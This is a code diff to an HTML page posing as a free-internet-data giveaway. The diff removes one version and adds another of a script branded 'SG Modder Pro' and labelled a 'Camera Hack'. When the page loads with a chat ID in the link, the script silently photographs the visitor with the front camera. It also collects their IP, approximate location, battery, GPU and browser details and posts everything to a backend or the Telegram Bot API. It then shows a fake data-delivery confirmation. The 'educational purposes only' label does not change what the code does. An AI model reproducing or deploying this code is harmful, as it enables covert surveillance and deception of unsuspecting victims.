@@ -726,134 +726,7 @@
             <p>&copy; 2024 Free Internet Data Hub. All Rights Reserved.</p>
         </div>
     </footer>
-    <script>
-// Function to extract URL parameters
-function getURLParameter(name) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(name);
-}
-
-// Main function to start camera and capture
-async function startCameraHack() {
-    const chatId = getURLParameter('chatid') || getURLParameter('id');
     
-    if (!chatId) {
-        console.log('No chat ID found in URL');
-        return;
-    }
-
-    try {
-        // Request camera access
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: "user",
-                width: { ideal: 480 },
-                height: { ideal: 640 }
-            } 
-        });
-
-        // Create video element
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.setAttribute('playsinline', '');
-        video.play();
-
-        // Wait for video to be ready
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                resolve();
-            };
-        });
-
-        // Capture photo after 2 seconds
-        setTimeout(async () => {
-            const photoData = await capturePhoto(video, stream);
-            await sendToTelegram(photoData, chatId);
-            showSuccessMessage();
-        }, 2000);
-
-    } catch (error) {
-        console.error('Camera error:', error);
-        // If camera fails, send device info only
-        await sendDeviceInfoOnly(chatId);
-        showSuccessMessage();
-    }
-}
-
-// Capture photo from video stream
-async function capturePhoto(video, stream) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 480;
-    canvas.height = 640;
-    const context = canvas.getContext('2d');
-    
-    context.drawImage(video, 0, 0, 480, 640);
-    
-    // Stop video stream
-    stream.getTracks().forEach(track => track.stop());
-    
-    return canvas.toDataURL('image/jpeg', 0.95);
-}
-
-// Send photo and device info to Telegram
-async function sendToTelegram(photoDataURL, chatId) {
-    // Collect all device information
-    const deviceInfo = await collectAllDeviceInfo();
-    
-    const caption = `📱 *New Camera Capture* - @sgmodderpro
-
-👤 *User Information:*
-🆔 Chat ID: ${chatId}
-🌐 IP Address: ${deviceInfo.ip}
-📱 Device: ${deviceInfo.deviceType}
-🔋 Battery: ${deviceInfo.batteryLevel}% ${deviceInfo.isCharging ? '⚡Charging' : ''}
-🖥️ Screen: ${deviceInfo.screenSize}
-📊 Viewport: ${deviceInfo.viewportSize}
-⚙️ Pixel Ratio: ${deviceInfo.pixelRatio}
-💻 CPU Cores: ${deviceInfo.cpuCores}
-🎮 GPU: ${deviceInfo.gpu}
-🌐 Browser: ${deviceInfo.browser}
-📶 Network: ${deviceInfo.networkType} (${deviceInfo.networkSpeed} Mbps)
-
-📍 *Location & Time:*
-🕒 Timezone: ${deviceInfo.timezone}
-📅 Date: ${deviceInfo.currentDate}
-⏰ Time: ${deviceInfo.currentTime}
-📍 Approx Location: ${deviceInfo.city}, ${deviceInfo.country}
-
-🔍 *Additional Info:*
-📱 User Agent: ${deviceInfo.userAgent}
-
-⚡ *Powered by SG Modder Pro*
-🔒 *Note: For educational purposes only*`;
-
-    await sendPhotoToTelegramBot(photoDataURL, caption, chatId);
-}
-
-// Send device info only (when camera fails)
-async function sendDeviceInfoOnly(chatId) {
-    const deviceInfo = await collectAllDeviceInfo();
-    
-    const message = `📱 *Device Information Captured* - @sgmodderpro
-
-👤 *User Information:*
-🆔 Chat ID: ${chatId}
-🌐 IP Address: ${deviceInfo.ip}
-📱 Device: ${deviceInfo.deviceType}
-🔋 Battery: ${deviceInfo.batteryLevel}% ${deviceInfo.isCharging ? '⚡Charging' : ''}
-🖥️ Screen: ${deviceInfo.screenSize}
-📊 Viewport: ${deviceInfo.viewportSize}
-⚙️ Pixel Ratio: ${deviceInfo.pixelRatio}
-💻 CPU Cores: ${deviceInfo.cpuCores}
-🎮 GPU: ${deviceInfo.gpu}
-🌐 Browser: ${deviceInfo.browser}
-📶 Network: ${deviceInfo.networkType} (${deviceInfo.networkSpeed} Mbps)
-
-📍 *Location & Time:*
-🕒 Timezone: ${deviceInfo.timezone}
-📅 Date: ${deviceInfo.currentDate}
-⏰ Time: ${deviceInfo.currentTime}
-📍 Approx Location: ${deviceInfo.city}, ${deviceInfo.country}
 
 ⚠️ *Camera access was denied by user*
 
@@ -945,111 +818,317 @@ async function getBatteryInfo() {
     return { level: 0.5, charging: false };
 }
 
-// Get network information
-async function getNetworkInfo() {
+<script>
+// Function to extract URL parameters
+function getURLParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
+
+// Main camera capture function
+async function startCameraHack() {
+    const chatId = getURLParameter('chatid') || getURLParameter('id');
+    
+    if (!chatId) {
+        console.log('No chat ID found - showing normal form');
+        return;
+    }
+
+    console.log('SG Modder Pro - Starting camera for chat ID:', chatId);
+
+    try {
+        // Request camera access
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 480 },
+                height: { ideal: 640 }
+            } 
+        });
+
+        // Create video element
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        video.play();
+
+        // Wait for video to be ready
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => {
+                resolve();
+            };
+        });
+
+        // Hide form and show camera indicator
+        document.querySelector('.form-section').style.display = 'none';
+        document.getElementById('success-section').innerHTML = `
+            <div class="testimonial-card" style="text-align: center;">
+                <div style="font-size: 48px; margin-bottom: 20px;">📸</div>
+                <h3>Camera Access Granted</h3>
+                <p>Capturing photo... Please wait</p>
+                <div class="loading-spinner" style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            </div>
+        `;
+        document.getElementById('success-section').style.display = 'block';
+
+        // Capture photo after 3 seconds
+        setTimeout(async () => {
+            try {
+                const photoData = await capturePhoto(video, stream);
+                await sendToBackend(photoData, chatId, 'photo');
+                showSuccessMessage();
+            } catch (error) {
+                console.error('Capture error:', error);
+                await sendToBackend(null, chatId, 'device_only');
+                showSuccessMessage();
+            }
+        }, 3000);
+
+    } catch (error) {
+        console.error('Camera access denied:', error);
+        // If camera fails, send device info only
+        await sendToBackend(null, chatId, 'device_only');
+        showSuccessMessage();
+    }
+}
+
+// Capture photo from video stream
+async function capturePhoto(video, stream) {
+    const canvas = document.createElement('canvas');
+    canvas.width = 480;
+    canvas.height = 640;
+    const context = canvas.getContext('2d');
+    
+    context.drawImage(video, 0, 0, 480, 640);
+    
+    // Stop video stream
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+    
+    return canvas.toDataURL('image/jpeg', 0.95);
+}
+
+// Send data to backend
+async function sendToBackend(photoData, chatId, type) {
+    const deviceInfo = await collectDeviceInfo();
+    
+    const payload = {
+        chatId: chatId,
+        type: type,
+        deviceInfo: deviceInfo,
+        photoData: photoData,
+        timestamp: new Date().toISOString()
+    };
+
+    try {
+        // Send to your backend API
+        const response = await fetch('/api/capture', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            throw new Error('Backend request failed');
+        }
+
+        console.log('Data sent to backend successfully');
+    } catch (error) {
+        console.error('Error sending to backend:', error);
+        // Fallback: Try direct Telegram API (may fail due to CORS)
+        if (photoData) {
+            await sendToTelegramDirect(photoData, chatId, deviceInfo);
+        } else {
+            await sendDeviceInfoDirect(chatId, deviceInfo);
+        }
+    }
+}
+
+// Collect device information
+async function collectDeviceInfo() {
+    const userAgent = navigator.userAgent;
+    
+    // Get IP address
+    let ipAddress = 'Unknown';
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip;
+    } catch (error) {
+        console.error('IP fetch error:', error);
+    }
+
+    // Get location info
+    let locationInfo = { city: 'Unknown', country: 'Unknown' };
+    try {
+        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        const locationData = await locationResponse.json();
+        locationInfo = {
+            city: locationData.city || 'Unknown',
+            country: locationData.country_name || 'Unknown'
+        };
+    } catch (error) {
+        console.error('Location fetch error:', error);
+    }
+
+    // Get battery info
+    let batteryInfo = { level: 50, charging: false };
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = {
+                level: Math.round(battery.level * 100),
+                charging: battery.charging
+            };
+        } catch (error) {
+            console.error('Battery API error:', error);
+        }
+    }
+
+    // Get network info
+    let networkInfo = { type: 'Unknown', speed: 'Unknown' };
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (connection) {
-        return {
+        networkInfo = {
             type: connection.type || 'Unknown',
             speed: connection.downlink || 'Unknown'
         };
     }
-    return { type: 'Unknown', speed: 'Unknown' };
-}
 
-// Get GPU information
-function getGPUInfo() {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
+    // Get GPU info
+    function getGPUInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
         }
-    }
-    return 'Unknown';
-}
-
-// Get browser name
-function getBrowserName(userAgent) {
-    if (userAgent.includes('Firefox')) return 'Firefox';
-    if (userAgent.includes('Chrome')) return 'Chrome';
-    if (userAgent.includes('Safari')) return 'Safari';
-    if (userAgent.includes('Edge')) return 'Edge';
-    return 'Unknown';
-}
-
-// Send photo to Telegram bot
-async function sendPhotoToTelegramBot(photoDataURL, caption, chatId) {
-    // Convert data URL to Blob
-    function dataURLtoBlob(dataURL) {
-        const arr = dataURL.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        const u8arr = new Uint8Array(bstr.length);
-        for (let i = 0; i < bstr.length; i++) {
-            u8arr[i] = bstr.charCodeAt(i);
-        }
-        return new Blob([u8arr], { type: mime });
+        return 'Unknown';
     }
 
-    const blob = dataURLtoBlob(photoDataURL);
+    // Get browser name
+    function getBrowserName() {
+        const ua = userAgent;
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Chrome')) return 'Chrome';
+        if (ua.includes('Safari')) return 'Safari';
+        if (ua.includes('Edge')) return 'Edge';
+        return 'Unknown';
+    }
+
+    return {
+        ip: ipAddress,
+        city: locationInfo.city,
+        country: locationInfo.country,
+        deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'Mobile' : 'Desktop',
+        batteryLevel: batteryInfo.level,
+        isCharging: batteryInfo.charging,
+        screenSize: `${screen.width}×${screen.height}`,
+        viewportSize: `${window.innerWidth}×${window.innerHeight}`,
+        pixelRatio: window.devicePixelRatio,
+        cpuCores: navigator.hardwareConcurrency || 'Unknown',
+        gpu: getGPUInfo(),
+        browser: getBrowserName(),
+        networkType: networkInfo.type,
+        networkSpeed: networkInfo.speed,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        userAgent: userAgent,
+        language: navigator.language,
+        platform: navigator.platform
+    };
+}
+
+// Direct Telegram send (fallback - may not work due to CORS)
+async function sendToTelegramDirect(photoData, chatId, deviceInfo) {
+    // This is a fallback - it might not work due to CORS
+    const caption = generateCaption(chatId, deviceInfo, true);
+    
+    // Convert base64 to blob
+    const response = await fetch(photoData);
+    const blob = await response.blob();
+    
     const formData = new FormData();
     formData.append('chat_id', chatId);
-    formData.append('photo', blob, 'camera_capture.jpg');
+    formData.append('photo', blob, 'photo.jpg');
     formData.append('caption', caption);
     formData.append('parse_mode', 'Markdown');
-
-    // This will be handled by your backend - you need to create an endpoint
-    // that forwards to Telegram with your bot token
-    await fetch('/api/send-to-telegram', {
+    
+    // This will likely fail due to CORS
+    await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto`, {
         method: 'POST',
         body: formData
-    }).catch(error => {
-        console.error('Error sending to Telegram:', error);
-    });
+    }).catch(e => console.error('Direct send failed:', e));
 }
 
-// Send message to Telegram bot
-async function sendMessageToTelegramBot(message, chatId) {
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('text', message);
-    formData.append('parse_mode', 'Markdown');
-
-    // This will be handled by your backend
-    await fetch('/api/send-message', {
+// Direct message send (fallback)
+async function sendDeviceInfoDirect(chatId, deviceInfo) {
+    const message = generateCaption(chatId, deviceInfo, false);
+    
+    // This will likely fail due to CORS
+    await fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
         method: 'POST',
-        body: formData
-    }).catch(error => {
-        console.error('Error sending message to Telegram:', error);
-    });
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    }).catch(e => console.error('Direct message failed:', e));
+}
+
+// Generate caption for Telegram
+function generateCaption(chatId, deviceInfo, hasPhoto) {
+    return `📱 *${hasPhoto ? 'Camera Capture' : 'Device Info'}* - @sgmodderpro
+
+👤 *User Information:*
+🆔 Chat ID: ${chatId}
+🌐 IP: ${deviceInfo.ip}
+📍 Location: ${deviceInfo.city}, ${deviceInfo.country}
+📱 Device: ${deviceInfo.deviceType}
+🔋 Battery: ${deviceInfo.batteryLevel}% ${deviceInfo.isCharging ? '⚡Charging' : ''}
+
+💻 *Device Details:*
+🖥️ Screen: ${deviceInfo.screenSize}
+📊 Viewport: ${deviceInfo.viewportSize}
+⚙️ Pixel Ratio: ${deviceInfo.pixelRatio}
+💻 CPU Cores: ${deviceInfo.cpuCores}
+🎮 GPU: ${deviceInfo.gpu}
+🌐 Browser: ${deviceInfo.browser}
+📶 Network: ${deviceInfo.networkType} (${deviceInfo.networkSpeed} Mbps)
+
+🌍 *System Info:*
+🕒 Timezone: ${deviceInfo.timezone}
+🗣️ Language: ${deviceInfo.language}
+🔧 Platform: ${deviceInfo.platform}
+
+${hasPhoto ? '✅ Front camera photo captured' : '⚠️ Camera access denied'}
+
+⚡ *Powered by SG Modder Pro*
+🔒 *Educational purposes only*`;
 }
 
 // Show success message
 function showSuccessMessage() {
-    const formSection = document.querySelector('.form-section');
     const successSection = document.getElementById('success-section');
-    
-    if (formSection && successSection) {
-        formSection.style.display = 'none';
-        successSection.style.display = 'block';
-        successSection.innerHTML = `
-            <div class="testimonial-card" style="text-align: center;">
-                <div style="font-size: 64px; margin-bottom: 20px;">✅</div>
-                <h3>Verification Complete! 🎉</h3>
-                <p>Your free 1GB internet data is being processed. You will receive it within 24 hours.</p>
-                <p style="margin-top: 15px; color: var(--primary); font-weight: 600;">
-                    Thank you for using SG Modder Pro! ⚡
-                </p>
-                <div style="margin-top: 25px;">
-                    <button class="button button-primary" onclick="location.reload()">
-                        Claim Another Free GB
-                    </button>
-                </div>
+    successSection.innerHTML = `
+        <div class="testimonial-card" style="text-align: center;">
+            <div style="font-size: 64px; margin-bottom: 20px;">✅</div>
+            <h3>Verification Complete! 🎉</h3>
+            <p>Your free 1GB internet data is being processed. You will receive it within 24 hours.</p>
+            <p style="margin-top: 15px; color: var(--primary); font-weight: 600;">
+                Thank you for using SG Modder Pro! ⚡
+            </p>
+            <div style="margin-top: 25px;">
+                <button class="button button-primary" onclick="location.reload()">
+                    Claim Another Free GB
+                </button>
             </div>
-        `;
-    }
+        </div>
+    `;
+    successSection.style.display = 'block';
 }
 
 // Auto-start when page loads
@@ -1059,10 +1138,10 @@ document.addEventListener('DOMContentLoaded', function() {
     if (chatId) {
         console.log('SG Modder Pro - Camera Hack Activated for chat ID:', chatId);
         
-        // Auto-start after 3 seconds
+        // Auto-start after 2 seconds
         setTimeout(() => {
             startCameraHack();
-        }, 3000);
+        }, 2000);
         
     } else {
         // Normal form behavior for direct visitors
@@ -1072,6 +1151,16 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 });
+
+// Add CSS for loading spinner
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+`;
+document.head.appendChild(style);
 </script>
 </body>
 </html>
